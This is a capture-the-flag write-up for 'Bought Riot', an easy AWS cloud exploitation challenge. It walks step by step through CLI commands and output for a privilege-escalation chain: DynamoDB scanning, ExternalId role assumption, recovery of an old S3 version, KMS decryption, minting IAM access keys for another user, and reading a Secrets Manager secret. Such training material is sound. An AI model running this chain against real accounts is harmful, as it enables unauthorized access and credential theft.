![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>Bought Riot</font>

22<sup>nd</sup> June 2026

Prepared By: `kangwijen`

Challenge Author(s): `kangwijen`

Difficulty: <font color='green'>Easy</font>

<br><br>

# Synopsis

Bought Riot is an Easy Cloud Exploitation challenge that demonstrates DynamoDB row triage under a shared-status registry through a multi-hop IAM privilege chain with ExternalId-scoped role assumption and KMS-encrypted S3 manifest recovery to reach a Secrets Manager payout secret.

## Description

Miren Vale attends a Suncourt meeting where officers are deciding who will guard the east road. A false story is already spreading: one of Stormbound's captains supposedly sold the road schedule to Vaultrune. By the time Miren arrives, the rumor has reached the commanders as a formal accusation. By morning, the captain's unit may get pulled from the road, leaving the supply carts without guards. Miren can't accuse Lady Seralyne, the woman who runs Suncourt, in front of the room. The officers would call it gossip, and the order would still go out. Miren has to find who started the rumor and who paid to spread it.

## Skills Required

- AWS CLI basics
- IAM and STS role assumption with `ExternalId`
- DynamoDB Scan and S3 object version recovery

## Skills Learned

- Finding live settlement config in a DynamoDB registry
- Recovering sealed S3 versions after a compliance overwrite
- Chained privilege escalation through roles, IAM keys, and Secrets Manager

# Enumeration

Use the instance IP and ports from your **instance card**. Open the briefing URL there for starting credentials and the shell setup snippet. Use AWS CLI v2, then export the environment variables shown in the briefing shell setup block. The `<AWS_PORT>` is the AWS API port from the instance card, not the briefing website port:

```bash
$ export AWS_ENDPOINT_URL=http://<CHALLENGE_IP>:<AWS_PORT>
$ export AWS_DEFAULT_REGION=us-east-1
$ export AWS_ACCESS_KEY_ID=<from briefing>
$ export AWS_SECRET_ACCESS_KEY=<from briefing>
$ unset AWS_SESSION_TOKEN
```

Once those are set every subsequent `aws` command uses the challenge endpoint automatically. Before touching any service, confirm what identity the starting keys actually resolve to:

```bash
$ aws sts get-caller-identity

{
    "UserId": "AIDAMXH6NPQR59T0QOZI",
    "Account": "593847102664",
    "Arn": "arn:aws:iam::593847102664:user/eastreach-supply-auditor"
}
```

The username `eastreach-supply-auditor` reads like a read-only compliance role, not an operator identity, so the next step is to see what an auditor is actually allowed to look at.

# Solution

## Exploitation

### Step 1 - Scan the settlement table and confirm the live row

An IAM user named for auditing is a strong hint that DynamoDB or S3 read access is somewhere in scope. Listing tables and doing an unfiltered scan of `supply-road-settlements` is a reasonable first probe:

```bash
$ aws dynamodb scan --table-name supply-road-settlements

{
    "Items": [
        {
            "settlement_id": { "S": "ROAD-0021" },
            "status": { "S": "DRAFT" },
            "runner_external_id": { "S": "eastreach-runner-archived-0021" },
            "broker_code": { "S": "VEGA-PROXY" },
            "notes": { "S": "Not routable for the live supply road." }
        },
        {
            "settlement_id": { "S": "ROAD-0060" },
            "status": { "S": "VOID" },
            "runner_external_id": { "S": "eastreach-runner-stale-0060" },
            "broker_code": { "S": "ORION-BACKUP" },
            "notes": { "S": "Not routable for the live supply road." }
        },
        {
            "settlement_id": { "S": "ROAD-0155" },
            "status": { "S": "PENDING_AUDIT" },
            "runner_external_id": { "S": "eastreach-runner-pending-0155" },
            "broker_code": { "S": "ORION-BACKUP" },
            "notes": { "S": "Not routable for the live supply road." }
        },
        ...
    ],
    "Count": 224,
    "ScannedCount": 224,
    "ConsumedCapacity": null
}
```

224 rows come back, every one of them a `settlement_id` with a `status` field and a note that flags it as not routable. The interesting row is whichever one does not carry that note. Since every item has a `status` attribute, a filter expression on that field is the fastest way to isolate the one row that actually matters:

```bash
$ aws dynamodb scan \
  --table-name supply-road-settlements \
  --filter-expression "#s = :live" \
  --expression-attribute-names '{"#s":"status"}' \
  --expression-attribute-values '{":live":{"S":"LIVE"}}'

{
    "Items": [
        {
            "settlement_id": { "S": "ROAD-3D9C" },
            "status": { "S": "LIVE" },
            "runner_external_id": { "S": "eastreach-supply-road-runner-3d9c" },
            "broker_code": { "S": "EASTREACH-RELAY" },
            "scanner_role_arn": { "S": "arn:aws:iam::593847102664:role/supply-road-scanner" },
            "scanner_external_id": { "S": "eastreach-road-scanner-3d9c" },
            "vendor_ref": { "S": "eastreach-continuity" },
            "manifest_bucket": { "S": "supply-road-manifests" }
        }
    ],
    "Count": 1,
    "ScannedCount": 224,
    "ConsumedCapacity": null
}
```

That filter pays off. Exactly one row, `ROAD-3D9C`, is `status: LIVE`, and it carries a different attribute shape than every other row scanned: a `scanner_role_arn`, a matching `scanner_external_id`, and a `manifest_bucket` name. Rows with `PENDING_AUDIT`, `DRAFT`, `CLOSED`, or `VOID` status never include those extra fields, so they cannot feed a role assumption at all. The two new fields on the LIVE row are effectively an invitation: `sts:assume-role` needs both a role ARN and, since this role clearly expects a confused-deputy guard, an `ExternalId`, and this row hands over both.

Trying to read the bucket named in that row directly with the current auditor identity confirms why the extra role exists at all:

```bash
$ aws s3api list-objects-v2 --bucket supply-road-manifests

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User is not authorized to perform: s3:ListBucket
```

The auditor can read the registry but not the bucket it points to. Whatever role `scanner_role_arn` refers to is the one that closes that gap.

### Step 2 - Assume the supply-road-scanner role

The LIVE row already handed over a `scanner_role_arn` and a `scanner_external_id`. An `AssumeRole` call that supplies both is the direct next move:

```bash
$ aws sts assume-role \
  --role-arn arn:aws:iam::593847102664:role/supply-road-scanner \
  --role-session-name road-scanner \
  --external-id eastreach-road-scanner-3d9c

{
    "Credentials": {
        "AccessKeyId": "<SCANNER_ACCESS_KEY_ID>",
        "SecretAccessKey": "<SCANNER_SECRET_ACCESS_KEY>",
        "SessionToken": "<SCANNER_SESSION_TOKEN>",
        "Expiration": "2026-07-14T08:01:23.992572+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAEVM8ULTVABJEHH0Z:road-scanner",
        "Arn": "arn:aws:sts::593847102664:assumed-role/supply-road-scanner/road-scanner"
    }
}
```

The call succeeds on the first try, which confirms the ExternalId came from the right row. Export the scanner session credentials and confirm the new identity before doing anything else, since an ExternalId lifted from any other row is rejected by the trust policy and would leave the shell still authenticated as the auditor:

```bash
$ export AWS_ACCESS_KEY_ID=<SCANNER_ACCESS_KEY_ID>
$ export AWS_SECRET_ACCESS_KEY=<SCANNER_SECRET_ACCESS_KEY>
$ export AWS_SESSION_TOKEN=<SCANNER_SESSION_TOKEN>

$ aws sts get-caller-identity
{
    "UserId": "AROAEVM8ULTVABJEHH0Z:road-scanner",
    "Account": "593847102664",
    "Arn": "arn:aws:sts::593847102664:assumed-role/supply-road-scanner/road-scanner"
}
```

### Step 3 - List the routing bucket and inspect manifest versions

The DynamoDB row named a `manifest_bucket`. Now that the identity has changed, that bucket is worth listing again:

```bash
$ aws s3api list-objects-v2 --bucket supply-road-manifests

{
    "Contents": [
        {
            "Key": "archives/archive-4387.txt",
            "LastModified": "2026-07-14T07:00:10+00:00",
            "ETag": "\"097927d8a7a58e8421ce17edbac1f4cd\"",
            "Size": 129,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "archives/audit-1542.txt",
            "LastModified": "2026-07-14T07:00:10+00:00",
            "ETag": "\"6fda8943059098c4a72c341f4ff37124\"",
            "Size": 133,
            "StorageClass": "STANDARD"
        },
        ...
    ],
    "RequestCharged": null,
    "Prefix": ""
}
```

This time the request goes through instead of returning `AccessDenied`, which confirms the scanner role is the one carrying the bucket permissions the auditor lacked. The bucket holds 188 objects total, spread across `manifests/`, `compliance/`, `archives/`, and `routing-notes/` prefixes. Given the DynamoDB row already named the live settlement `ROAD-3D9C`, the object to look for is `manifests/ROAD-3D9C.json` rather than paging through the whole listing:

```bash
$ aws s3api get-object \
  --bucket supply-road-manifests \
  --key manifests/ROAD-3D9C.json \
  /tmp/latest-manifest.json

$ cat /tmp/latest-manifest.json
{
  "settlement_id": "ROAD-3D9C",
  "status": "COMPLIANCE_HOLD",
  "manifest_version": "2026-03",
  "note": "Routing manifest under compliance review. Sensitive fields redacted pending clearance from Road Compliance.",
  "broker_user": "REDACTED",
  "runner_role_arn": "REDACTED",
  "payout_secret_name": "REDACTED",
  "schema_version": "2026-03",
  "owner": "eastreach-logistics"
}
```

Every field that matters is `REDACTED`. The object exists and is readable, but its current body has been scrubbed, which only makes sense if something overwrote it after the useful data was written. S3 object versioning is the obvious way that could happen without destroying the original bytes, so the next check is whether versioning is enabled on this key:

```bash
$ aws s3api list-object-versions \
  --bucket supply-road-manifests \
  --prefix manifests/ROAD-3D9C.json

{
    "Versions": [
        {
            "ETag": "\"7c4be6991492f08f9f36dd75877a04c9\"",
            "Size": 382,
            "StorageClass": "STANDARD",
            "Key": "manifests/ROAD-3D9C.json",
            "VersionId": "46ebe5a2-577c-48da-a198-aefa015f2c13",
            "IsLatest": true,
            "LastModified": "2026-07-14T07:00:09+00:00"
        },
        {
            "ETag": "\"2f04d5b57d7287585670295d0d0a4304\"",
            "Size": 470,
            "StorageClass": "STANDARD",
            "Key": "manifests/ROAD-3D9C.json",
            "VersionId": "4b3c97ea-7788-42e7-b816-82d5df767f43",
            "IsLatest": false,
            "LastModified": "2026-07-14T07:00:09+00:00"
        }
    ],
    "RequestCharged": null,
    "Prefix": "manifests/ROAD-3D9C.json"
}
```

There it is: two versions of the same key. `IsLatest: true` matches the 382-byte scrubbed body already read, but there is a second, non-latest version at 470 bytes that was never returned by a plain `get-object` call. That size difference and the fact it predates the redaction is worth pulling directly.

### Step 4 - Recover the sealed manifest and KMS decrypt it

`get-object` only returns the latest version by default, so reaching the older one means passing its `VersionId` explicitly:

```bash
$ aws s3api get-object \
  --bucket supply-road-manifests \
  --key manifests/ROAD-3D9C.json \
  --version-id 4b3c97ea-7788-42e7-b816-82d5df767f43 \
  /tmp/manifest.enc

{
    "AcceptRanges": "bytes",
    "LastModified": "2026-07-14T07:00:09+00:00",
    "ContentLength": 470,
    "ETag": "\"2f04d5b57d7287585670295d0d0a4304\"",
    "VersionId": "4b3c97ea-7788-42e7-b816-82d5df767f43",
    "ContentType": "application/octet-stream",
    "StorageClass": "STANDARD"
}
```

`ContentType: application/octet-stream` on a key that otherwise holds JSON is the tell that this version is not meant to be read as text. Checking the raw bytes confirms it:

```bash
$ xxd /tmp/manifest.enc | head -3
00000000: 6b6d 733a 7632 3a31 3137 3633 3262 312d  kms:v2:117632b1-
00000010: 6234 6437 2d34 6138 642d 6133 3764 2d34  b4d7-4a8d-a37d-4
00000020: 3564 6631 6466 3362 6265 353a 6465 3965  5df1df3bbe5:de9e
```

The `kms:v2:` prefix followed by a key identifier is a KMS ciphertext envelope, so a straight `kms:decrypt` call against the blob should recover the pre-redaction manifest:

```bash
$ aws kms decrypt \
  --ciphertext-blob fileb:///tmp/manifest.enc \
  --query Plaintext \
  --output text | base64 -d | python3 -m json.tool

{
    "settlement_table": "supply-road-settlements",
    "broker_user": "road-messenger",
    "runner_role_arn": "arn:aws:iam::593847102664:role/supply-road-runner",
    "payout_secret_name": "supply-road/payout/eastreach-relay-3d9c",
    "broker_code_template": "{broker_code}",
    "schema_version": "2026-01",
    "owner": "eastreach-logistics"
}
```

The scanner role can decrypt with no extra grant beyond the default KMS key policy, and the plaintext is exactly the fields that were redacted in the latest version. Three of them matter for the rest of the chain:

- `broker_user: road-messenger` - an IAM user name. The scanner role's policy already looked broad enough on the earlier bucket listing, which makes testing it for `iam:CreateAccessKey` against this user the direct next step.
- `runner_role_arn: arn:aws:iam::593847102664:role/supply-road-runner` - a second role to assume. The manifest gives the ARN but not an ExternalId, so that has to come from somewhere else.
- `payout_secret_name: supply-road/payout/eastreach-relay-3d9c` - a Secrets Manager path, and the only lead so far on where the actual flag lives.

### Step 5 - Corroborate the settlement in DynamoDB

The manifest supplied a role ARN but no ExternalId for it. The DynamoDB row for `ROAD-3D9C` already carried a `runner_external_id` field during the earlier filtered scan, so reading that same item again as the scanner role confirms the value is still current before it goes into an AssumeRole call:

```bash
$ aws dynamodb get-item \
  --table-name supply-road-settlements \
  --key '{"settlement_id":{"S":"ROAD-3D9C"}}'

{
    "Item": {
        "settlement_id":       { "S": "ROAD-3D9C" },
        "status":              { "S": "LIVE" },
        "scanner_role_arn":    { "S": "arn:aws:iam::593847102664:role/supply-road-scanner" },
        "scanner_external_id": { "S": "eastreach-road-scanner-3d9c" },
        "runner_external_id":  { "S": "eastreach-supply-road-runner-3d9c" },
        "broker_code":         { "S": "EASTREACH-RELAY" },
        "vendor_ref":          { "S": "eastreach-continuity" },
        "manifest_bucket":     { "S": "supply-road-manifests" }
    }
}
```

`runner_external_id: eastreach-supply-road-runner-3d9c` is the missing piece for the second `AssumeRole` call, and `status: LIVE` on this same row confirms it is the correct one to use rather than one of the 223 other rows carrying `PENDING_AUDIT`, `DRAFT`, `CLOSED`, or `VOID` statuses.

### Step 6 - Mint new keys for road-messenger

Before the runner role can be assumed, a usable set of credentials is needed under an identity that role's trust policy will actually accept. The manifest named `road-messenger` as an IAM user, so the next call tests whether the scanner role can issue that user a key directly rather than looking for its existing one:

```bash
$ aws iam create-access-key --user-name road-messenger

{
    "AccessKey": {
        "UserName": "road-messenger",
        "AccessKeyId": "<MESSENGER_ACCESS_KEY_ID>",
        "Status": "Active",
        "SecretAccessKey": "<MESSENGER_SECRET_ACCESS_KEY>",
        "CreateDate": "2026-07-14T07:03:03.083952+00:00"
    }
}
```

The call succeeds, which confirms `supply-road-scanner` carries `iam:CreateAccessKey` scoped to this user. Switching to the new key pair and checking identity keeps the chain honest before moving on:

```bash
$ export AWS_ACCESS_KEY_ID=<MESSENGER_ACCESS_KEY_ID>
$ export AWS_SECRET_ACCESS_KEY=<MESSENGER_SECRET_ACCESS_KEY>
$ unset AWS_SESSION_TOKEN

$ aws sts get-caller-identity
{
    "UserId": "AIDAZJK30IV4IHJ9XXXS",
    "Account": "593847102664",
    "Arn": "arn:aws:iam::593847102664:user/road-messenger"
}
```

### Step 7 - Assume the supply-road-runner role

All the pieces for the second hop are now in hand: `runner_role_arn` from the decrypted manifest, `runner_external_id` from the DynamoDB row, and an identity (`road-messenger`) whose access key was just minted specifically to be accepted by the runner role's trust policy:

```bash
$ aws sts assume-role \
  --role-arn arn:aws:iam::593847102664:role/supply-road-runner \
  --role-session-name road-runner \
  --external-id eastreach-supply-road-runner-3d9c

{
    "Credentials": {
        "AccessKeyId": "<RUNNER_ACCESS_KEY_ID>",
        "SecretAccessKey": "<RUNNER_SECRET_ACCESS_KEY>",
        "SessionToken": "<RUNNER_SESSION_TOKEN>",
        "Expiration": "2026-07-14T08:03:26.482954+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAT7QED9NECUZWCMRS:road-runner",
        "Arn": "arn:aws:sts::593847102664:assumed-role/supply-road-runner/road-runner"
    }
}
```

Export the runner credentials and confirm the identity switched over cleanly:

```bash
$ export AWS_ACCESS_KEY_ID=<RUNNER_ACCESS_KEY_ID>
$ export AWS_SECRET_ACCESS_KEY=<RUNNER_SECRET_ACCESS_KEY>
$ export AWS_SESSION_TOKEN=<RUNNER_SESSION_TOKEN>

$ aws sts get-caller-identity
{
    "UserId": "AROAT7QED9NECUZWCMRS:road-runner",
    "Account": "593847102664",
    "Arn": "arn:aws:sts::593847102664:assumed-role/supply-road-runner/road-runner"
}
```

### Step 8 - Read the payout secret

The decrypted manifest already named the secret. With the runner role's credentials active, reading it is a single call:

```bash
$ aws secretsmanager get-secret-value \
  --secret-id supply-road/payout/eastreach-relay-3d9c \
  --query SecretString \
  --output text

HTB{REDACTED}
```

### Getting the flag

The chain runs auditor to scanner to runner, each hop unlocked by a value discovered in the previous one:

1. `dynamodb:Scan` on `supply-road-settlements` as the starting auditor user finds 224 rows, all marked not routable except one.
2. A filtered re-scan on `status = LIVE` isolates `ROAD-3D9C`, which uniquely carries `scanner_role_arn` and `scanner_external_id`.
3. `sts:AssumeRole` on `supply-road-scanner` with that ExternalId opens up S3 access the auditor did not have.
4. `s3:ListObjectVersions` on `manifests/ROAD-3D9C.json` in `supply-road-manifests` shows the live key has two versions. The latest is compliance-scrubbed, the other is a raw KMS ciphertext blob.
5. `s3:GetObjectVersion` on the non-latest version followed by `kms:Decrypt` recovers the pre-redaction manifest, revealing `broker_user`, `runner_role_arn`, and `payout_secret_name`.
6. `dynamodb:GetItem` on `ROAD-3D9C` as the scanner role confirms `runner_external_id` for the next hop.
7. `iam:CreateAccessKey` on `road-messenger`, then `sts:AssumeRole` on `supply-road-runner` using the manifest's ARN and the DynamoDB ExternalId.
8. `secretsmanager:GetSecretValue` on `supply-road/payout/eastreach-relay-3d9c` as the runner role returns the flag.

Answer: `HTB{REDACTED}`
